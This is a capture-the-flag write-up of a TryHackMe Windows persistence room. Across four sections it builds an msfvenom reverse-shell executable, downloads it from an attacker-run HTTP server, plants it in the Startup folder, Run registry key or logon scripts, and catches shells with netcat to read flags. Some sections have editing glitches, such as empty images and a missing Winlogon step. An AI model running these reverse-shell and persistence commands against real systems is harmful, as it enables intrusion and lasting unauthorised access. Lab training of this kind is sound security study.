# About This Module
Module link: https://tryhackme.com/room/windowslocalpersistence

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/06/2023

# Startup Folder
1. Started up this task's machine
2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.157.221 LPORT=9999 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
```
3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
4. `sudo python3 -m http.server` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
5. `PowerShell` from the compromised Windows machine
```PowerShell
C:\Users\Administrator>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```
6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine
```PowerShell
PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshell.exe
```
7. `dir` from the compromised Windows machine
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/7/2023   5:31 PM           7168 revshell.exe
```
8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>` from the compromised Windows machine
```PowerShell
PS C:\Users\Administrator> move revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
        1 file(s) moved.
```
9. Sign out and log back in from the compromised Windows machine

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Sign%20Out.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnect.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnected.png)

```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.236.33 49721 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
10. `C:\flags\flag10.exe` from our reverse shell on our attack machine to
```PowerShell
C:\Windows\system32>C:\flags\flag10.exe
C:\flags\flag10.exe
THM{NO_NO_AFTER_YOU}
```


**TASK COMPLETED!**

# Run / RunOnce
1. Started up this task's machine
2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe`
```Bash
root@ip-10-10-157-221:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.157.221 LPORT=9999 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
```
3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
4. `sudo python3 -m http.server` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
5. `PowerShell` from the compromised Windows machine
```PowerShell
C:\Users\Administrator>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```
6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine
```PowerShell
PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshell.exe
```
7. `dir` from the compromised Windows machine
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/7/2023   5:31 PM           7168 revshell.exe
```
8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>`
```PowerShell
PS C:\Users\Administrator>move revshell.exe C:\Windows
        1 file(s) moved.
```
9. `regedit` and go to HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
```PowerShell
PS C:\Users\Administrator> regedit
```PowerShell
C:\Users\Administrator>regedit
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20Open.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20HKEY_LOCAL_MACHINE%20Software%20Microsoft%20Windows%20CurrentVersion%20Run.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20HKEY_LOCAL_MACHINE%20Software%20Microsoft%20Windows%20CurrentVersion%20Run%20Payload.png)

10. Sign out and log back in

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Sign%20Out.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnect.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnected.png)

```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.236.33 49943 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
11. `C:\flags\flag11.exe`
```PowerShell
C:\Windows\system32>C:\flags\flag11.exe
C:\flags\flag11.exe
THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}
```


**TASK COMPLETED!**

# Winlogon
1. Started up this task's machine
2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.157.221 LPORT=9999 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
```
3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
4. `sudo python3 -m http.server` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
5. `PowerShell` from the compromised Windows machine
```PowerShell
C:\Users\Administrator>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```
6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine
```PowerShell
PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshell.exe
```
7. `dir` from the compromised Windows machine
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/7/2023   5:31 PM           7168 revshell.exe
```
8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>`
```PowerShell
```PowerShell
PS C:\Users\Administrator>move revshell.exe C:\Windows
        1 file(s) moved.
```
9. `regedit`
```PowerShell
C:\Users\Administrator>regedit
```

![]()

![]()

![]()

10. Sign out and log back in

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Sign%20Out.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnect.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnected.png)

```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.236.33 49956 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
11. `C:\flags\flags12.exe`
```PowerShell
C:\Windows\system32>C:\flags\flag12.exe
C:\flags\flag12.exe
THM{I_INSIST_GO_FIRST}
```


**TASK COMPLETED**

# Logon Scripts
1. Started up this task's machine
2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.157.221 LPORT=9999 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
```
3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
4. `sudo python3 -m http.server` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
5. `PowerShell` from the compromised Windows machine
```PowerShell
C:\Users\Administrator>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```
6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine
```PowerShell
PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshell.exe
```
7. `dir` from the compromised Windows machine
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/7/2023   5:31 PM           7168 revshell.exe
```
8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>`
```PowerShell
```PowerShell
PS C:\Users\Administrator>move revshell.exe C:\Windows
        1 file(s) moved.
```
9. `regedit`
```PowerShell
C:\Users\Administrator>regedit
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20Open.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20Current%20User%20Environment%20.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20Current%20User%20Environment%20pt2.png)

10. Sign out and log back in

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Sign%20Out.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnect.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnected.png)

```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.236.33 49969 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

11. `C:\flags\flag13.exe`
```PowerShell
C:\Windows\system32>C:\flags\flag13.exe
C:\flags\flag13.exe
THM{USER_TRIGGERED_PERSISTENCE_FTW}
```


**TASK COMPLETED**
